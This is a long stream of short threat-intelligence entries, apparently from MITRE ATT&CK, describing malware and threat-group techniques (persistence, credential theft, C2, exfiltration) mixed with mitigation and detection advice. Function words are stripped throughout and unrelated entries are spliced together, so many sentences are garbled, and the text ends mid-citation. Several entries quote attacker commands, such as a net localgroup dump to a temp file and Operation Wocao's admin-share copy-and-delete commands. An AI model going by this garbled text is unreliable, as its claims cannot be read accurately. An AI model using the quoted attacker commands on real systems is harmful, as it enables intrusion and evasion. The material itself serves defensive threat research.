[FunnyDream](https://attack.mitre.org/software/S1044) Keyrecord component capture keystrokes.(Citation: Bitdefender FunnyDream Campaign November 2020) [PinchDuke](https://attack.mitre.org/software/S0048) gathers configuration information.(Citation: F-Secure Dukes) [Lazarus Group](https://attack.mitre.org/groups/G0032) variety tools operations, including [Responder](https://attack.mitre.org/software/S0174), PuTTy PSCP, Wake-On-Lan, ChromePass, dbxcli.(Citation: ESET Lazarus Jun 2020)(Citation: ClearSky Lazarus Aug 2020)(Citation: Kaspersky ThreatNeedle Feb 2021) (Citation: FireEye admin@338) [Milan](https://attack.mitre.org/software/S1015) executable named `companycatalogue` benign.(Citation: ClearSky Siamesekitten August 2021) [Emotet](https://attack.mitre.org/software/S0367) Powershell retrieve malicious payload download additional resources [Mimikatz](https://attack.mitre.org/software/S0002). (Citation: Symantec Emotet Jul 2018)(Citation: Trend Micro Emotet Jan 2019)(Citation: Picus Emotet Dec 2018)(Citation: Red Canary Emotet Feb 2019)(Citation: Carbon Black Emotet Apr 2019) [BBK](https://attack.mitre.org/software/S0470) ability [cmd](https://attack.mitre.org/software/S0106) Portable Executable (PE) compromised host.(Citation: Trend Micro Tick November 2019) [Mofang](https://attack.mitre.org/groups/G0103) delivered spearphishing emails malicious documents, PDFs, Excel files attached.(Citation: FOX-IT 2016 Mofang) [Cuba](https://attack.mitre.org/software/S0625) retrieve ARP cache local <code>GetIpNetTable</code>.(Citation: McAfee Cuba April 2021)  [APT-C-36](https://attack.mitre.org/groups/G0099) ConfuserEx obfuscate variant [Imminent Monitor](https://attack.mitre.org/software/S0434), compressed payload RAT packages, password protected encrypted email attachments avoid detection.(Citation: QiAnXin APT-C-36 Feb2019) [Valak](https://attack.mitre.org/software/S0476) determine Windows version compromised host.(Citation: Cybereason Valak 2020)(Citation: SentinelOne Valak June 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware maintained persistence creating LNK shortcut user’s Startup folder.(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: ClearSky Lazarus Aug 2020) [PipeMon](https://attack.mitre.org/software/S0501) communication module custom protocol based TLS TCP.(Citation: ESET PipeMon 2020) [QUADAGENT](https://attack.mitre.org/software/S0269) obfuscated Invoke-Obfuscation.(Citation: Unit 42 QUADAGENT July 2018)(Citation: GitHub Invoke-Obfuscation) [Ke3chang](https://attack.mitre.org/groups/G0004) performs service discovery <code>net start</code> commands.(Citation: Mandiant Operation Ke3chang November 2014) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors [ipconfig](https://attack.mitre.org/software/S0100) discovery remote systems.(Citation: Bitdefender FunnyDream Campaign November 2020) [Nidiran](https://attack.mitre.org/software/S0118) RC4 encrypt C2 traffic.(Citation: Symantec Suckfly 2016) [menuPass](https://attack.mitre.org/groups/G0045) native APIs including <code>GetModuleFileName</code>, <code>lstrcat</code>, <code>CreateFile</code>, <code>ReadFile</code>.(Citation: Symantec Cicada November 2020) Windows 10, enable Attack Surface Reduction (ASR) rules prevent Office applications creating child processes writing malicious executable content disk. (Citation: win10_asr) Manage access control list "Replicating Directory Changes" permissions domain controller replication.(Citation: ADSecurity Mimikatz DCSync)(Citation: Replication ACL) multi-factor authentication user privileged accounts. embedded network devices support TACACS+ RADIUS.  Follow vendor prescribed practices hardening access control. (Citation: Cisco IOS Software Integrity Assurance - TACACS) [Waterbear](https://attack.mitre.org/software/S0579) RC4 encrypted shellcode encrypted functions.(Citation: Trend Micro Waterbear December 2019) [Threat Group-3390](https://attack.mitre.org/groups/G0027) <code>net view</code> command.(Citation: Nccgroup Emissary Panda 2018) Monitor process memory inconsistencies, checking memory ranges legitimate module.(Citation: Hiding Malicious Code Module Stomping) (Citation: FireEye FIN6 Apr 2019) [Fysbis](https://attack.mitre.org/software/S0410) ability delete files.(Citation: Fysbis Dr Analysis) [APT1](https://attack.mitre.org/groups/G0006) publicly malware privilege escalation.(Citation: Mandiant APT1) [Mimikatz](https://attack.mitre.org/software/S0002)'s kerberos module create golden tickets.(Citation: GitHub Mimikatz kerberos Module)(Citation: Cobalt Strike Manual 4.3 November 2020) Protect generated event files stored locally proper permissions authentication limit opportunities adversaries increase privileges preventing Privilege Escalation opportunities.  [Ke3chang](https://attack.mitre.org/groups/G0004) backdoor RoyalDNS established persistence adding service called <code>Nwsapagent</code>.(Citation: NCC APT15 Alive Strong) [Bisonal](https://attack.mitre.org/software/S0268) Registry key <code>HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\</code> persistence.(Citation: Unit 42 Bisonal July 2018)(Citation: Talos Bisonal Mar 2020)  Ensure local administrator accounts complex, unique passwords systems network. [GoldenSpy](https://attack.mitre.org/software/S0493) execute remote commands Windows command <code>WinExec()</code> API.(Citation: Trustwave GoldenSpy June 2020)	 [Flame](https://attack.mitre.org/software/S0143) regular screenshots applications command control server.(Citation: Kaspersky Flame) [TrailBlazer](https://attack.mitre.org/software/S0682) masquerade C2 traffic legitimate Google Notifications requests.(Citation: CrowdStrike StellarParticle January 2022) Obfuscate/encrypt event files locally transit avoid feedback adversary. [ZeroT](https://attack.mitre.org/software/S0230) gathers victim's name, Windows version, language, sends C2 server.(Citation: Proofpoint ZeroT Feb 2017) [APT29](https://attack.mitre.org/groups/G0016) <code>fsutil</code> check space executing actions create files disk.(Citation: Deep Dive Solorigate January 2021) [DarkWatchman](https://attack.mitre.org/software/S0673) load DLLs.(Citation: Prevailion DarkWatchman 2021) [XCSSET](https://attack.mitre.org/software/S0658) compress entire <code>~/Desktop</code> folders excluding <code>.git</code> folders, total data size 200MB.(Citation: trendmicro xcsset xcode project 2020) [S-Type](https://attack.mitre.org/software/S0085) deleted files created compromised host.(Citation: Cylance Dust Storm) [Kimsuky](https://attack.mitre.org/groups/G0094) manipulated timestamps creation compilation dates defeat anti-forensics.(Citation: Cybereason Kimsuky November 2020) [Penquin](https://attack.mitre.org/software/S0587) Cron create periodic pre-scheduled background jobs.(Citation: Leonardo Turla Penquin 2020) Monitor API calls altering data. Remote access tools built-in features interact Windows API gather information. [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) relied student targets malicious link email.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) Network intrusion detection prevention systems network signatures identify traffic specific adversary command control infrastructure malware mitigate activity network level. [JPIN](https://attack.mitre.org/software/S0201) communicate FTP.(Citation: PLATINUM April 2016) [InvisiMole](https://attack.mitre.org/software/S0260) running services victim.(Citation: ESET InvisiMole June 2018) [APT29](https://attack.mitre.org/groups/G0016) <code>Get-AcceptedDomain</code> PowerShell cmdlet enumerate accepted domains Exchange Management Shell.(Citation: Volexity SolarWinds) [AdFind](https://attack.mitre.org/software/S0552) enumerate domains discover trust federated domains.(Citation: Deep Dive Solorigate January 2021)(Citation: CrowdStrike StellarParticle January 2022) [Bandook](https://attack.mitre.org/software/S0234) command built raw TCP socket.(Citation: CheckPoint Bandook Nov 2020)  [DEATHRANSOM](https://attack.mitre.org/software/S0616) download files compromised host.(Citation: FireEye FiveHands April 2021) [BONDUPDATER](https://attack.mitre.org/software/S0360) DGA communicate command control servers.(Citation: FireEye APT34 Dec 2017) [3PARA RAT](https://attack.mitre.org/software/S0066) command retrieve metadata files disk command list current directory.(Citation: CrowdStrike Putter Panda) [TSCookie](https://attack.mitre.org/software/S0436) ability proxy communications command control (C2) servers.(Citation: JPCert BlackTech Malware September 2019) [Zebrocy](https://attack.mitre.org/software/S0251) runs <code>ipconfig /all</code> command.(Citation: ESET Zebrocy 2019) [Lazarus Group](https://attack.mitre.org/groups/G0032) VBA embedded macros Word documents execute malicious code.(Citation: McAfee Lazarus Jul 2020)(Citation: ClearSky Lazarus Aug 2020)(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) [jRAT](https://attack.mitre.org/software/S0283) query kill processes.(Citation: Symantec Frutas Feb 2013) [FIN5](https://attack.mitre.org/groups/G0053) customized version [PsExec](https://attack.mitre.org/software/S0029), tools [pwdump](https://attack.mitre.org/software/S0006), [SDelete](https://attack.mitre.org/software/S0195), [Windows Credential Editor](https://attack.mitre.org/software/S0005).(Citation: Mandiant FIN5 GrrCON Oct 2016)  [Duqu](https://attack.mitre.org/software/S0038) inject processes evade detection. selection target process influenced security software installed (Duqu inject processes depending security suite installed infected host).(Citation: Symantec W32.Duqu) [Carbanak](https://attack.mitre.org/software/S0030) encrypts strings analysis difficult.(Citation: FireEye CARBANAK June 2017) [Kazuar](https://attack.mitre.org/software/S0265) FTP FTPS communicate C2 server.(Citation: Unit 42 Kazuar 2017) [GreyEnergy](https://attack.mitre.org/software/S0342) enumerates Windows services.(Citation: ESET GreyEnergy Oct 2018) [Sliver](https://attack.mitre.org/software/S0633) mutual TLS RSA  cryptography exchange session key.(Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver Encryption) [SHARPSTATS](https://attack.mitre.org/software/S0450) ability identify domain compromised host.(Citation: TrendMicro POWERSTATS V3 June 2019) [DarkComet](https://attack.mitre.org/software/S0334) list active processes running victim’s machine.(Citation: Malwarebytes DarkComet March 2018) [DRATzarus](https://attack.mitre.org/software/S0694) named `Flash.exe`, dropper named `IExplorer`.(Citation: ClearSky Lazarus Aug 2020) [GoldenSpy](https://attack.mitre.org/software/S0493) execute remote commands command-line interface.(Citation: Trustwave GoldenSpy June 2020)	 [Windigo](https://attack.mitre.org/groups/G0124) delivered generic Windows proxy Win32/Glubteta.M. [Windigo](https://attack.mitre.org/groups/G0124) multiple reverse proxy chains C2 infrastructure.(Citation: ESET Windigo Mar 2014) Monitor files unexpected modifications file names mismatched file disk binary's metadata. indicator binary renamed compiled.   [Rover](https://attack.mitre.org/software/S0090) searches files local drives based predefined list file extensions.(Citation: Palo Alto Rover) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Monitor newly constructed network connections received untrusted hosts.  [Cuba](https://attack.mitre.org/software/S0625) function <code>GetIpNetTable</code> recover connections victim's machine.(Citation: McAfee Cuba April 2021)  [Stuxnet](https://attack.mitre.org/software/S0603) Windows rootkit mask binaries relevant files.(Citation: Symantec W.32 Stuxnet Dossier) [PlugX](https://attack.mitre.org/software/S0013) module download execute files compromised machine.(Citation: CIRCL PlugX March 2013)(Citation: Proofpoint TA416 Europe March 2022) [NotPetya](https://attack.mitre.org/software/S0368) searches files dozens file extensions prior encryption.(Citation: District Court Indictment GRU Unit 74455 October 2020) Users checking changing <code>HISTCONTROL</code>, <code>HISTFILE</code>, <code>HISTFILESIZE</code> environment variables suspicious. [Meteor](https://attack.mitre.org/software/S0688) execution scheduled task named `Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeAll` creates separate scheduled task called `mstask` wiper 23:55:00.(Citation: Check Meteor Aug 2021) [CARROTBALL](https://attack.mitre.org/software/S0465) executed users lured malicious e-mail attachments.(Citation: Unit 42 CARROTBAT January 2020) [Doki](https://attack.mitre.org/software/S0600) executed scripts /bin/sh.(Citation: Intezer Doki July 20) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware WhiskeyAlfa-Three modifies sector 0 Master Boot Record (MBR) ensure malware persist victim machine shuts down.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) [Gamaredon Group](https://attack.mitre.org/groups/G0047) DOCX files download malicious DOT document templates RTF template injection download malicious payloads.(Citation: Proofpoint RTF Injection) [Gamaredon Group](https://attack.mitre.org/groups/G0047) inject malicious macros remote templates documents compromised systems.(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021)(Citation: Actinium February 2022)(Citation: Unit 42 Gamaredon February 2022)(Citation: Secureworks IRON TILDEN Profile) [BlackEnergy](https://attack.mitre.org/software/S0089) gather specific attached USB devices, include device instance drive geometry.(Citation: Securelist BlackEnergy Nov 2014) Monitor newly executed processes delete alter generated artifacts persistence host system.  [Bumblebee](https://attack.mitre.org/software/S1039) named component DLLs "RapportGP.dll" match security company Trusteer.(Citation: Medium Ali Salem Bumblebee April 2022) [Lokibot](https://attack.mitre.org/software/S0447) ability initiate contact command control (C2) exfiltrate stolen data.(Citation: FSecure Lokibot November 2019) [Comnie](https://attack.mitre.org/software/S0244) establishes persistence .lnk file victim’s startup path.(Citation: Palo Alto Comnie) [Duqu](https://attack.mitre.org/software/S0038) command control protocol's data stream encrypted AES-CBC.(Citation: Symantec W32.Duqu) [UNC2452](https://attack.mitre.org/groups/G0118) private encryption key Active Directory Federation Services (AD FS) container decrypt SAML signing certificates.(Citation: 365 Defender Solorigate) [TrickBot](https://attack.mitre.org/software/S0266) module shareDll/mshareDll discovers network shares WNetOpenEnumA API.(Citation: ESET Trickbot Oct 2020)(Citation: Bitdefender Trickbot March 2020) "ZJ" variant [BACKSPACE](https://attack.mitre.org/software/S0031) "ZJ link" infections Internet access relay traffic "ZJ listen" command server.(Citation: FireEye APT30) [Darkhotel](https://attack.mitre.org/groups/G0012) malware employed just-in-time decryption strings evade sandbox detection.(Citation: Lastline DarkHotel Time Decryption Nov 2015) [FrameworkPOS](https://attack.mitre.org/software/S0503) collect elements credit card data process memory.(Citation: SentinelOne FrameworkPOS September 2019) [ROKRAT](https://attack.mitre.org/software/S0240) send collected files C2 channel.(Citation: Talos ROKRAT) [Lazarus Group](https://attack.mitre.org/groups/G0032) rundll32 execute malicious payloads compromised host.(Citation: McAfee Lazarus Jul 2020)(Citation: ESET Lazarus Jun 2020)(Citation: ESET Twitter Ida Pro Nov 2021) Monitor contextual data account, include username, user ID, environmental data, etc. modify access tokens operate user security context perform actions bypass access controls. Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Green Lambert](https://attack.mitre.org/software/S0690) DNS C2 communications.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021) [Pteranodon](https://attack.mitre.org/software/S0147) decrypt encrypted data strings prior them.(Citation: Actinium February 2022) [HiddenWasp](https://attack.mitre.org/software/S0394) installs reboot persistence adding <code>/etc/rc.local</code>.(Citation: Intezer HiddenWasp Map 2019) [BoxCaon](https://attack.mitre.org/software/S0651) uploads files data compromised host existing C2 channel.(Citation: Checkpoint IndigoZebra July 2021) [Trojan.Karagany](https://attack.mitre.org/software/S0094) create directories store plugin output stage data exfiltration.(Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019) [NotPetya](https://attack.mitre.org/software/S0368) modified version [Mimikatz](https://attack.mitre.org/software/S0002) gather credentials lateral movement.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)(Citation: NCSC Joint Report Public Tools) [ThiefQuest](https://attack.mitre.org/software/S0595) exfiltrates targeted file extensions <code>/Users/</code> folder command control server unencrypted HTTP. Network packets string pieces information: file path contents file base64 encoded string.(Citation: wardle evilquest partii)(Citation: reed thiefquest ransomware analysis) [PoisonIvy](https://attack.mitre.org/software/S0012) inject malicious DLL process.(Citation: FireEye Poison Ivy)(Citation: Symantec Darkmoon Aug 2005) [admin@338](https://attack.mitre.org/groups/G0018) actors command exploitation machine [LOWBALL](https://attack.mitre.org/software/S0042) malware list local groups: <code>net localgroup administrator >> %temp%\download</code>(Citation: FireEye admin@338) [Kivars](https://attack.mitre.org/software/S0437) ability initiate keylogging infected host.(Citation: TrendMicro BlackTech June 2017) [Kimsuky](https://attack.mitre.org/groups/G0094) links e-mail steal account information.(Citation: VirusBulletin Kimsuky October 2019)(Citation: Malwarebytes Kimsuky June 2021)(Citation: KISA Operation Muzabi) [Cobalt Group](https://attack.mitre.org/groups/G0080) Word OLE compound documents malicious obfuscated VBA macros user execution.(Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Aug 2017)(Citation: IB Cobalt Aug 2017)(Citation: Morphisec Cobalt Gang Oct 2018)(Citation: Unit 42 Cobalt Gang Oct 2018)(Citation: TrendMicro Cobalt Nov 2017) [TrickBot](https://attack.mitre.org/software/S0266) Base64-encode C2 commands.(Citation: Cyberreason Anchor December 2019) [RATANKBA](https://attack.mitre.org/software/S0241) <code>net user</code> command.(Citation: RATANKBA) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors scheduled tasks download backdoor tools.(Citation: BlackBerry CostaRicto November 2020)  [RunningRAT](https://attack.mitre.org/software/S0253) adds Registry key <code>Software\Microsoft\Windows\CurrentVersion\Run</code> establish persistence reboot.(Citation: McAfee Gold Dragon) [Goopy](https://attack.mitre.org/software/S0477) ability cmd.exe execute commands passed Outlook C2 channel.(Citation: Cybereason Cobalt Kitty 2017)	 [CoinTicker](https://attack.mitre.org/software/S0369) executes bash script establish reverse shell.(Citation: CoinTicker 2019) Monitor contextual data service/daemon, include name, service executable, start type maliciously modify components victim environment hinder disable defensive mechanisms. [C0015](https://attack.mitre.org/campaigns/C0015), threat actors malicious HTA file contained mix JavaScript/VBScript code.(Citation: DFIR Conti Bazar Nov 2021) [Empire](https://attack.mitre.org/software/S0363) modules leverage API hooking carry tasks, netripper.(Citation: Github PowerShell Empire) [Mori](https://attack.mitre.org/software/S1047) resolve networking APIs strings ADD-encrypted.(Citation: DHS CISA AA22-055A MuddyWater February 2022) Monitor newly constructed network connections [Valid Accounts](https://attack.mitre.org/techniques/T1078) interact remote machines Distributed Component Object Model (DCOM). adversary perform actions logged-on user. Monitor influxes abnormal increases DCOM Distributed Computing Environment/Remote Procedure (DCE/RPC) traffic (typically port 135). login items created shared file lists viewable Preferences GUI <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> file.(Citation: Login Items Apple)(Citation: Startup Items Eclectic)(Citation: objsee block blocking login items)(Citation: sentinelone macos persist Jun 2019) locations monitored audited. [ThreatNeedle](https://attack.mitre.org/software/S0665) file directory information.(Citation: Kaspersky ThreatNeedle Feb 2021) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) current user’s Startup folder “Narrator.exe” persistence.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [BitPaymer](https://attack.mitre.org/software/S0570) RegEnumKeyW iterate Registry keys.(Citation: Crowdstrike Indrik November 2018)  [BoomBox](https://attack.mitre.org/software/S0635) search specific files directories machine.(Citation: MSTIC Nobelium Toolset 2021) Ensure local administrator accounts complex, unique passwords systems network. [StoneDrill](https://attack.mitre.org/software/S0380) relied injecting payload process memory victim's preferred browser.(Citation: Kaspersky StoneDrill 2017) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors discovered network disks mounted [netstat](https://attack.mitre.org/software/S0104).(Citation: FoxIT Wocao December 2019)  [Action RAT](https://attack.mitre.org/software/S1028)'s commands, strings, domains Base64 encoded payload.(Citation: MalwareBytes SideCopy Dec 2021) malicious code served ads, adblockers prevent code executing place.

Script blocking extensions prevent execution JavaScript commonly exploitation process. [PoisonIvy](https://attack.mitre.org/software/S0012) stages collected data file.(Citation: Symantec Darkmoon Aug 2005) [Rifdoor](https://attack.mitre.org/software/S0433) distributed e-mails malicious Excel Word documents.(Citation: Carbon Black HotCroissant April 2020) Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization. Outlook methods, blocking macros ineffective Visual Basic engine features separate macro scripting engine.(Citation: SensePost Outlook Forms) released patches address issue. Ensure KB3191938 blocks Outlook Visual Basic displays malicious code warning, KB4011091 disables custom forms default, KB4011162 removes legacy feature, applied systems.(Citation: SensePost Outlook Page) [FlawedAmmyy](https://attack.mitre.org/software/S0381) attempt detect anti-virus products initial infection.(Citation: Proofpoint TA505 Mar 2018) Monitor queried domain (DNS) registry data compromise third-party infrastructure targeting. Detection efforts focused stages adversary lifecycle, Command Control. [GCMAN](https://attack.mitre.org/groups/G0036) Putty lateral movement.(Citation: Securelist GCMAN) (Citation: Baumgartner Naikon 2015)(Citation: CameraShy) [Cleaver](https://attack.mitre.org/groups/G0003) created customized tools payloads functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, backdoors, process enumeration, WMI querying, SMB communications, network interface sniffing, keystroke logging.(Citation: Cylance Cleaver) [Astaroth](https://attack.mitre.org/software/S0373) executes embedded JScript VBScript XSL stylesheet located remote domain. (Citation: Cybereason Astaroth Feb 2019) (Citation: Dell Lateral Movement)(Citation: ThreatStream Evasion Analysis) Monitor Registry key modifications <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\</code>.
Tools Sysinternals Autoruns detect attempts persistence, including listing Active Setup Registry locations startup folders.(Citation: TechNet Autoruns) Suspicious program execution startup programs outlier processes compared historical data. [Sandworm Team](https://attack.mitre.org/groups/G0034) VBScript WMI queries.(Citation: Dragos Crashoverride 2018)  [StrongPity](https://attack.mitre.org/software/S0491) delete exfiltrated files compromised host.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) [Turla](https://attack.mitre.org/groups/G0010) <code>fsutil fsinfo drives</code> list connected drives.(Citation: ESET ComRAT 2020) Monitor cloud services unexpected modifications settings data  [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors exploited CVE-2017-11882 execute code victim's machine.(Citation: Talos Frankenstein June 2019) [Turla](https://attack.mitre.org/groups/G0010) WebDAV upload stolen USB files cloud drive.(Citation: Symantec Waterbug Jun 2019) [Turla](https://attack.mitre.org/groups/G0010) exfiltrated stolen files OneDrive 4shared.(Citation: ESET ComRAT 2020) Monitor analyze network flows protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns). analyzing newly constructed network connections received untrusted hosts, unexpcted hardware devices, uncommon data flows. [jRAT](https://attack.mitre.org/software/S0283) browse file systems.(Citation: Kaspersky Adwind Feb 2016)(Citation: Symantec Frutas Feb 2013) Monitor newly constructed network connections received untrusted hosts.  [WhisperGate](https://attack.mitre.org/software/S0689) recognize presence monitoring tools target system.(Citation: Unit 42 WhisperGate January 2022) [Kivars](https://attack.mitre.org/software/S0437) ability conceal activity hiding active windows.(Citation: TrendMicro BlackTech June 2017) [TrickBot](https://attack.mitre.org/software/S0266) delivered malicious links phishing e-mails.(Citation: Cyberreason Anchor December 2019) [OopsIE](https://attack.mitre.org/software/S0264) command prompt execute commands victim's machine.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 OilRig Sept 2018) [Winnti Linux](https://attack.mitre.org/software/S0430) encode configuration file single-byte XOR encoding.(Citation: Chronicle Winnti Linux 2019) multi-factor authentication user privileged accounts. [Small Sieve](https://attack.mitre.org/software/S1035) ability custom hex byte swapping encoding scheme combined obfuscated Base64 function protect program strings Telegram credentials.(Citation: NCSC GCHQ Sieve Jan 2022) [Saint Bot](https://attack.mitre.org/software/S1018) `.vbs` scripts execution.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) Remove users local administrator systems.

By requiring password, adversary terminal access, password sudoers file. Setting timestamp_timeout 0 require user input password time sudo executed. [Machete](https://attack.mitre.org/software/S0409) hijacks clipboard data creating overlapped window listens keyboard events.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)  [FunnyDream](https://attack.mitre.org/software/S1044) parse `ProxyServer` string Registry discover proxies.(Citation: Bitdefender FunnyDream Campaign November 2020) [DarkWatchman](https://attack.mitre.org/software/S0673) retrieve browser history.(Citation: Prevailion DarkWatchman 2021) [StrifeWater](https://attack.mitre.org/software/S1034) ability screen captures.(Citation: Cybereason StrifeWater Feb 2022) Monitor executed commands arguments actions collect files network share. Remote access tools built-in features interact Windows API gather location. Data acquired staged Windows management tools Windows Management Instrumentation PowerShell. [Lazarus Group](https://attack.mitre.org/groups/G0032) malware multiple channels C2, RomeoWhiskey-Two, consists RAT channel parses data datagram form Proxy channel forms virtual point-to-point sessions.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors consistently removed traces activity overwriting file `/c /d c:\windows\temp\ & \\<IP ADDRESS>\c$\windows\system32\devmgr.dll \\<IP ADDRESS>\c$\windows\temp\LMAKSW.ps1 /y` deleting overwritten file `/c /d c:\windows\temp\ & del \\<IP ADDRESS>\c$\windows\temp\LMAKSW.ps1`.(Citation: FoxIT Wocao December 2019) [LAPSUS$](https://attack.mitre.org/groups/G1004) gathered detailed knowledge organization's supply chain relationships.(Citation: MSTIC DEV-0537 Mar 2022) [Pupy](https://attack.mitre.org/software/S0192) grab system’s including OS version, architecture, etc.(Citation: GitHub Pupy) [Lazarus Group](https://attack.mitre.org/groups/G0032) hosted malicious downloads Github Dropbox.(Citation: CISA AppleJeus Feb 2021)(Citation: ClearSky Lazarus Aug 2020) [SUNBURST](https://attack.mitre.org/software/S0559) collected list service names hashed FNV-1a + XOR algorithm check similarly-hashed hardcoded blocklists.(Citation: FireEye SUNBURST Backdoor December 2020) (Citation: NCC WastedLocker June 2020) (Citation: MSTIC DEV-0537 Mar 2022) [StrongPity](https://attack.mitre.org/software/S0491) identify ESET BitDefender antivirus installed dropping payload.(Citation: Talos Promethium June 2020) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) ability create reverse shells Perl scripts.(Citation: ANSSI Sandworm January 2021) Ensure root accounts complex, unique passwords systems network. [HyperBro](https://attack.mitre.org/software/S0398) list services configurations.(Citation: Unit42 Emissary Panda 2019) [FIN5](https://attack.mitre.org/groups/G0053) customized version PsExec.(Citation: Mandiant FIN5 GrrCON Oct 2016) [Wizard Spider](https://attack.mitre.org/groups/G0102) scheduled tasks install [TrickBot](https://attack.mitre.org/software/S0266), task names legitimate WinDotNet, GoogleTask, Sysnetsf.(Citation: CrowdStrike Grim Spider 2019) common document file names malware binaries.(Citation: FireEye KEGTAP SINGLEMALT October 2020) [BADCALL](https://attack.mitre.org/software/S0245) modifies firewall Registry key <code>SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfileGloballyOpenPorts\\List</code>.(Citation: US-CERT BADCALL) [Mis-Type](https://attack.mitre.org/software/S0084) create temporary user named `Lost_{Unique Identifier}`.(Citation: Cylance Dust Storm) [TinyTurla](https://attack.mitre.org/software/S0668) mimicked existing Windows service installed <code>Windows Time Service</code>.(Citation: Talos TinyTurla September 2021) domain user local administrator multiple systems. [NETWIRE](https://attack.mitre.org/software/S0198) capture session logon details compromised host.(Citation: FireEye NETWIRE March 2019) [Magic Hound](https://attack.mitre.org/groups/G0059) granted compromised email accounts read access email boxes additional targeted accounts. authenticate intended victim's OWA (Outlook Access) portal read hundreds email communications Middle East organizations.(Citation: FireEye APT35 2018)  [Pillowmint](https://attack.mitre.org/software/S0517) uninstall malicious service infected machine.(Citation: Trustwave Pillowmint June 2020) [Flagpro](https://attack.mitre.org/software/S0696) relied users clicking malicious attachment delivered spearphishing.(Citation: NTT Security Flagpro December 2021) [Machete](https://attack.mitre.org/software/S0409) startup folder persistence.(Citation: Securelist Machete Aug 2014)(Citation: Cylance Machete Mar 2017) [Sandworm Team](https://attack.mitre.org/groups/G0034) malware enumerate email settings, including usernames passwords, M.E.Doc application.(Citation: ESET Telebots July 2017)	 [HermeticWizard](https://attack.mitre.org/software/S0698) ability `wevtutil system` event logs.(Citation: ESET Hermetic Wizard March 2022) [DustySky](https://attack.mitre.org/software/S0062) created folders temp directories host collected files exfiltration.(Citation: Kaspersky MoleRATs April 2019) [ZxShell](https://attack.mitre.org/software/S0412) delete files system.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014)  [APT32](https://attack.mitre.org/groups/G0050) renamed NetCat binary kb-10233.exe masquerade Windows update. [APT32](https://attack.mitre.org/groups/G0050) renamed Cobalt Strike beacon payload install_flashplayers.exe. (Citation: Cybereason Cobalt Kitty 2017)(Citation: Volexity Ocean Lotus November 2020) [Rifdoor](https://attack.mitre.org/software/S0433) encrypted command control (C2) communications stream cipher.(Citation: Carbon Black HotCroissant April 2020) Monitor drive letters mount data storage devices attempts read sensitive locations partition boot sector, master boot record, disk partition table, BIOS parameter block/superblock. [Olympic Destroyer](https://attack.mitre.org/software/S0365) attempts remote machines network.(Citation: Talos Olympic Destroyer 2018) [Calisto](https://attack.mitre.org/software/S0274) collect data user directories.(Citation: Securelist Calisto July 2018) [Ke3chang](https://attack.mitre.org/groups/G0004) compromised networks exploiting Internet-facing applications, including vulnerable Exchange SharePoint servers.(Citation: NICKEL December 2021) [Clop](https://attack.mitre.org/software/S0611) searched folders subfolders files encrypt.(Citation: Mcafee Clop Aug 2019) [InvisiMole](https://attack.mitre.org/software/S0260) gathers IP forwarding table, MAC address, configured proxy, network SSID.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) Limit credential overlap accounts systems training users administrators password multiple accounts. [StoneDrill](https://attack.mitre.org/software/S0380) check antivirus antimalware programs.(Citation: Kaspersky StoneDrill 2017)	 [QuasarRAT](https://attack.mitre.org/software/S0262) TCP C2 communication.(Citation: CISA AR18-352A Quasar RAT December 2018) [ZxxZ](https://attack.mitre.org/software/S1013) relied victims malicious attachment delivered email.(Citation: Cisco Talos Bitter Bangladesh 2022) [WarzoneRAT](https://attack.mitre.org/software/S0670) XOR 0x45 decrypt obfuscated code.(Citation: Check Warzone Feb 2020) [Valak](https://attack.mitre.org/software/S0476) delivered spearphishing e-mails password protected ZIP files.(Citation: Unit 42 Valak July 2020) [Tarrask](https://attack.mitre.org/software/S1011) create “hidden” scheduled tasks persistence.(Citation: Tarrask scheduled task) [ComRAT](https://attack.mitre.org/software/S0126) load file memory file execute <code>CreateProcessW</code>.(Citation: ESET ComRAT 2020) [RCSession](https://attack.mitre.org/software/S0662) C2 communications.(Citation: Trend Micro DRBControl February 2020)(Citation: Profero 